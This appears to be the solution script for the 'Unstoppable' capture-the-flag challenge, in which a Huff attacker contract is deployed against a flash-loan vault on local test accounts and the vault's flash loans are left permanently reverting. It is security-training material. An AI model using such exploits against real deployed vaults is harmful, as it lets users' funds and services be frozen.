from ape import accounts, project
from eth_abi import encode
from ..utils.helper import get_sig, send_tx, w3, reverts, deploy_huff_contract

TOKENS_IN_VAULT = w3.to_wei(1000000, "ether")
INITIAL_ATTACKER_TOKEN_BALANCE = w3.to_wei(10, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    user = accounts.test_accounts[2]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n⇒ Some user: {user}\n---\n"
    )

    # deploy token and vault contracts
    print("\n--- Deploying Token and vault contracts ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)
    vault = project.UnstoppableVault.deploy(
        token,
        deployer,
        deployer,
        sender=deployer,
    )
    assert vault.asset() == token

    # deposit tokens into vault
    print("\n--- Depositing tokens into vault ---\n")
    token.approve(vault, TOKENS_IN_VAULT, sender=deployer)
    vault.deposit(TOKENS_IN_VAULT, deployer, sender=deployer)

    assert token.balanceOf(vault) == TOKENS_IN_VAULT
    assert vault.totalAssets() == TOKENS_IN_VAULT
    assert vault.totalSupply() == TOKENS_IN_VAULT
    assert vault.maxFlashLoan(token) == TOKENS_IN_VAULT
    assert vault.flashFee(token, TOKENS_IN_VAULT - 1) == 0
    assert vault.flashFee(token, TOKENS_IN_VAULT) == w3.to_wei(50000, "ether")

    # transfer initial tokens to attacker
    print("\n--- Sending our attacker an initial balance of tokens ---\n")
    token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE, sender=deployer)
    assert token.balanceOf(attacker) == INITIAL_ATTACKER_TOKEN_BALANCE

    # define initial balances for attacker and vault
    attacker_initial_bal = token.balanceOf(attacker) / 10**18
    vault_initial_bal = token.balanceOf(vault) / 10**18

    # assert vault and attacker have correct amounts of tokens
    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ vault: {vault_initial_bal}\n---\n"
    )

    # ensure that user can execute a flashloan
    print("\n--- Showing our user can perform a flashloan ---\n")
    receiver = project.ReceiverUnstoppable.deploy(vault.address, sender=user)
    tx = receiver.executeFlashLoan(w3.to_wei(100, "ether"), sender=user)
    assert tx

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = deploy_huff_contract(
        "UnstoppableAttacker.huff",
        encode(["address", "address"], [vault.address, token.address]),
        attacker,
    )
    token.approve(
        attacker_contract,
        INITIAL_ATTACKER_TOKEN_BALANCE,
        sender=attacker,
    )
    send_tx(attacker, attacker_contract, get_sig("attack()"))

    # --- AFTER EXPLOIT --- #

    # define ending balances for attacker and vault
    attacker_ending_bal = token.balanceOf(attacker) / 10**18
    vault_ending_bal = token.balanceOf(vault) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Attacker: {attacker_ending_bal}\n⇒ vault: {vault_ending_bal}\n---\n"
    )

    print("\n--- After exploit: User will not be able to execute a flashloan ---\n")
    with reverts():
        receiver.executeFlashLoan(w3.to_wei(100, "ether"), sender=user)

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
